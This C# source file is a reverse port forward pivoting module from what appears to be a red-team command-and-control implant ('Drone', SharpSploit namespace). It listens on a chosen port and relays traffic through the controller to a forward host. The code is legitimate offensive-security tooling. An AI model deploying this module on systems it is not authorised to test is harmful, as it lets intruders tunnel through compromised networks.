using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;

using Drone.Modules;
using Drone.SharpSploit.Generic;

namespace Drone.SharpSploit.Pivoting
{
    public class ReversePortForward : SharpSploitResult
    {
        public int BindPort { get; }
        
        private readonly string _forwardHost;
        private readonly int _forwardPort;

        private bool _running;
        private TcpListener _listener;

        private readonly ConcurrentQueue<ReversePortForwardPacket> _inbound = new();
        private readonly ConcurrentQueue<byte[]> _outbound = new();

        public ReversePortForward(int bindPort, string forwardHost, int forwardPort)
        {
            BindPort = bindPort;
            _forwardHost = forwardHost;
            _forwardPort = forwardPort;
        }

        public void Start()
        {
            var endPoint = new IPEndPoint(IPAddress.Any, BindPort);
            
            _listener = new TcpListener(endPoint);
            _listener.Start();
            
            _running = true;

            while (_running)
            {
                try
                {
                    var client = _listener.AcceptTcpClient();
                    var stream = client.GetStream();
                    var inData = ReadFromStream(stream);

                    var inPacket = new ReversePortForwardPacket
                    {
                        BindPort = BindPort,
                        ForwardHost = _forwardHost,
                        ForwardPort = _forwardPort,
                        Data = Convert.ToBase64String(inData)
                    };

                    _inbound.Enqueue(inPacket);

                    while (_outbound.IsEmpty)
                    {
                        // do nothing
                        Thread.Sleep(100);
                    }

                    if (!_outbound.TryDequeue(out var outPacket)) continue;
                    stream.Write(outPacket, 0, outPacket.Length);
                    
                    client.Close();
                }
                catch (SocketException)
                {
                    // ignore
                }
            }
        }

        private static byte[] ReadFromStream(Stream stream)
        {
            using var ms = new MemoryStream();
            
            int read;
            do
            {
                var buf = new byte[1024];
                read = stream.Read(buf, 0, buf.Length);
                ms.Write(buf, 0, read);
            }
            while (read >= 1024);

            return ms.ToArray();
        }

        public bool GetData(out ReversePortForwardPacket packet)
        {
            if (_inbound.IsEmpty)
            {
                packet = null;
                return false;
            }

            if (!_inbound.TryDequeue(out var p))
            {
                packet = null;
                return false;
            }
            
            packet = p;
            return true;
        }

        public void SendData(byte[] data)
        {
            _outbound.Enqueue(data);
        }

        public void Stop()
        {
            _running = false;
            _listener.Stop();
        }

        protected internal override IList<SharpSploitResultProperty> ResultProperties =>
            new List<SharpSploitResultProperty>
            {
                new() {Name = "BindPort", Value = BindPort},
                new() {Name = "ForwardHost", Value = _forwardHost},
                new() {Name = "ForwardPort", Value = _forwardPort}
            };
    }
}